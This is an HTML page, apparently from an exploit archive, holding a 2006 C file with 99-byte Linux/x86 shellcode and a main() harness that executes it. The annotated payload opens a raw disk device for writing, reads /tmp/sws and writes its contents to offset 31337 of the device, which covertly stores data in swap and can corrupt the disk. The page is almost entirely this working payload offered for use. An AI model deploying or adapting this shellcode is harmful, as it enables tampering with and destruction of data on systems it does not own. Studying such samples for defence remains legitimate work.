<html><head><title>Linux/x86 - SWAP store - 99 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 
 * linux-x86-swap-store.c - SWAP store shellcode 99 bytes for Linux/x86
 * Copyright (c) 2006 Gotfault Security &amp; rfdslabs
 *
 * Authors:
 *
 *	dx 	&lt;xgc@gotfault.net&gt; 
 *	spud	&lt;gustavo@rfdslabs.com.br&gt;
 * 
 * This shellcode reads the content of '/tmp/sws' and stores on swap 
 * device at offset 31337. Probaly needs to change the device path name
 * in open() device syscall.
 *
 */

char shellcode[] =

  /* open(device, O_WRONLY) */

  &quot;\x6a\x05&quot;                    // push   $0x5
  &quot;\x58&quot;                        // pop    %eax
  &quot;\x99&quot;                        // cltd   
  &quot;\x52&quot;                        // push   %edx
  &quot;\x68\x73\x64\x61\x31&quot;        // push   $0x31616473
  &quot;\x68\x64\x65\x76\x2f&quot;        // push   $0x2f766564
  &quot;\x66\x68\x2f\x2f&quot;            // pushw  $0x2f2f
  &quot;\x89\xe3&quot;                    // mov    %esp,%ebx
  &quot;\x6a\x01&quot;                    // push   $0x1
  &quot;\x59&quot;                        // pop    %ecx
  &quot;\xcd\x80&quot;                    // int    $0x80

  &quot;\x97&quot;                        // xchg   %eax,%edi

  /* open(&quot;/tmp/sws&quot;, O_RDONLY) */

  &quot;\x49&quot;                        // dec    %ecx
  &quot;\x52&quot;                        // push   %edx
  &quot;\x68\x2f\x73\x77\x73&quot;        // push   $0x7377732f
  &quot;\x68\x2f\x74\x6d\x70&quot;        // push   $0x706d742f
  &quot;\x89\xe3&quot;                    // mov    %esp,%ebx
  &quot;\x6a\x05&quot;                    // push   $0x5
  &quot;\x58&quot;                        // pop    %eax
  &quot;\xcd\x80&quot;                    // int    $0x80

  &quot;\x93&quot;                        // xchg   %eax,%ebx

  /* read(fd_filename, *buf, 256) */

  &quot;\x89\xe1&quot;                    // mov    %esp,%ecx
  &quot;\x42&quot;                        // inc    %edx
  &quot;\xc1\xe2\x0a&quot;                // shl    $0xa,%edx
  &quot;\x6a\x03&quot;                    // push   $0x3
  &quot;\x58&quot;                        // pop    %eax
  &quot;\xcd\x80&quot;                    // int    $0x80

  &quot;\x96&quot;                        // xchg   %eax,%esi

  /* close(fd_filename) */

  &quot;\x6a\x06&quot;                    // push   $0x6
  &quot;\x58&quot;                        // pop    %eax
  &quot;\xcd\x80&quot;                    // int    $0x80

  &quot;\x92&quot;                        // xchg   %eax,%edx

  /* lseek(fd_device, 31337, SEEK_SET) */

  &quot;\x31\xc9&quot;                    // xor    %ecx,%ecx
  &quot;\x6a\x13&quot;                    // push   $0x13
  &quot;\x58&quot;                        // pop    %eax
  &quot;\x89\xfb&quot;                    // mov    %edi,%ebx
  &quot;\x66\xb9\x69\x7a&quot;            // mov    $0x7a69,%cx
  &quot;\xcd\x80&quot;                    // int    $0x80

  /* write(fd_device, *buf, 1025) */


  &quot;\x89\x14\x34&quot;                // mov    %edx,(%esp,%esi,1)
  &quot;\x6a\x04&quot;                    // push   $0x4
  &quot;\x58&quot;                        // pop    %eax
  &quot;\x54&quot;                        // push   %esp
  &quot;\x59&quot;                        // pop    %ecx
  &quot;\x56&quot;                        // push   %esi
  &quot;\x5a&quot;                        // pop    %edx
  &quot;\x42&quot;                        // inc    %edx
  &quot;\xcd\x80&quot;                    // int    $0x80

  /* close(fd_device) */

  &quot;\xb0\x06&quot;                    // mov    $0x6,%al
  &quot;\xcd\x80&quot;                    // int    $0x80

  /* exit(anything) */

  &quot;\xb0\x01&quot;                    // mov    $0x1,%al
  &quot;\xcd\x80&quot;                    // int    $0x80
;

int main() {
 
        int (*f)() = (int(*)())shellcode;
        printf(&quot;Length: %u\n&quot;, strlen(shellcode));
        f();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
